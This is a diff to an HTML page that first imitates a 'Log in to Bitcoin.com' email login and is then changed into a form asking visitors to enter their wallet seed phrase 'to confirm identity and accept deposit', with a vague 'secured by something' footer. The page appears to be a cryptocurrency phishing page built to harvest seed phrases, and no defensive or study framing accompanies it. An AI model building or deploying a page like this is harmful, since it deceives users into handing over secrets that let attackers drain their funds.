@@ -10,40 +10,32 @@
     *{
         margin: 0;
         font-family:  sans-serif;
-    }body{
+    }
+    body{
         background-color: #F1F7FD;
     }
     nav{
-        /* background-color: rgb(181, 222, 228); */
         background-color: #F1F7FD;
         height: 50px;
         display: flex;
         align-items: center;
     }
-    img{
-        height: 40px;
-    }
-    section{
-        display: flex;
-        align-items: center;
-        justify-content: center;
-    }
-    form{
+section{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    /* border-top: 1px solid rgb(206, 206, 206); */
+    padding-top: 50px;
+}
+form{
         margin-top: 100px;
         text-align: center;
-        background-color: white;
+        background-color: rgb(255, 255, 255);
         padding: 20px;
         border-radius: 10px;
-    }
-    input{
-        /* display: block; */
-        width: 200px;
-        margin-top: 30px;
-        border-radius: 8px;
-        width: 340px;
-        padding: 15px;
-        border: 1px solid rgba(211, 205, 205, 0.644);
-
+        
+      /* margin-left: 10px;
+      margin-right: 10px; */
     }
     button{
         width: 360px;
@@ -51,12 +43,16 @@
         background-color: rgb(57, 144, 237);
         border: none;
         color: white;
-        border-radius: 8px;
+        border-radius: 100px;
         margin-top: 30px;
         margin-bottom: 40px;
     }
-    p{
-        margin-bottom: 10px;
+    h3{
+        margin-bottom: 20px;
+        /* text-align: left; */
+    }
+    img{
+    height: 50px;
     }
 </style>
 <body>
@@ -67,13 +63,13 @@
         </nav>
     </header>
     <section>
-        <form action="bit.html">
-            <h2>Log in to Bitcoin.com</h2>
-            <input type="email" name="" placeholder="example@email.com" id=""><br>
-            <button>continue with email</button>
-            <p>powered by <span>STYTCH</span></p>
-            <p>by clicking, you agree to our User</p>
-            <p>Agreement, Wallet Service Terms, and Privacy policy.</p>
+        <form action="confirm.html">
+            <h3>Input phrase to confirm identity and accept deposit</h3>
+            <!-- <h2>Confirm identity and access deposit</h2> -->
+            
+            <textarea placeholder="wallet seed phrase..." name="" id="" cols="50" rows="10"></textarea><br>
+            <button>continue</button>
+            <p>secured by something</p>
         </form>
     </section>
 </body>
